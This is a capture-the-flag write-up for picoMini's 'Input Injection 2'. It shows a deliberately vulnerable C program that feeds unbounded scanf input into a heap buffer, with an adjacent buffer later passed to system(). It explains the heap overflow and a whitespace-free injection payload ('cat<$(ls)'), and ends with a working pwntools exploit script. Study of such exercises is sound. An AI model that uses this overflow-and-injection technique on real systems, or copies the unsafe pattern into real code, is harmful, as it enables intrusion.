---
title: "picoMini: Input Injection 2"
tags:
  - ctf
date: 2025-10-24
---
# Problem
![[media/ctf/picoCTF/Input Injection 2/description.png]]
# Solution
Much like [[Input Injection 1]], we are given `vuln` and `vuln.c`. `vuln.c` is as follows:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
	char* username = malloc(28);
	char* shell = malloc(28);
	
	printf("username at %p\n", username);
	fflush(stdout);
	printf("shell at %p\n", shell);
	fflush(stdout);
	
	strcpy(shell, "/bin/pwd");
	
	printf("Enter username: ");
	fflush(stdout);
	scanf("%s", username);
	
	printf("Hello, %s. Your shell is %s.\n", username, shell);
	system(shell);
	fflush(stdout);
	
	return 0;
}
```

Here, `username` and `shell` are allocated on the heap. Their addresses are printed using the `%p` format specifier, then the constant string "/bin/pwd" is `strcpy()`'d to `shell` before `username` is `scanf()`'d from `stdin`, and finally `shell` is run with `system()`. In this challenge, similar to the last, we can overwrite `shell` by overflowing `username`, and therefore inject a command to be run by `system()`.

As we are conveniently given the addresses of `username` and `shell`, we can compute the offset of `shell` to `username`, and thereby determine how many characters of `username` are required to start overflowing `shell`. The major challenge here is that `scanf()` *only reads until the first white space character*. Most commands accept (or require) arguments - that is, are in the form `<command> <argument>` - which means `scanf()` would stop reading at the end of the command.

After a bit of tinkering in the terminal, I realized that [redirections](https://www.gnu.org/software/bash/manual/html_node/Redirections.html) (`<`, `>`) could be used to redirect the result of `ls` (which yielded only `flag.txt`) into `cat`. Thus, the payload `cat<$(ls)` (free of any white space!) would be read in full by `scanf()` and later executed by `system()` as `cat flag.txt`.
## Script
```python
from pwn import *

hostname = ...
port = ...
p = remote(hostname, port)

# Compute offset required to overwrite
username_addr = int(p.recvline().split()[-1], 16)
shell_addr = int(p.recvline().split()[-1], 16)
diff = shell_addr - username_addr

p.recvuntil(b"username: ")

# Scanf stops at first whitespace
# This payload cats the result of ls without spaces
name = b"a"*diff + b"cat<$(ls)"
p.sendline(name)

res = p.recvline()
print(res)
```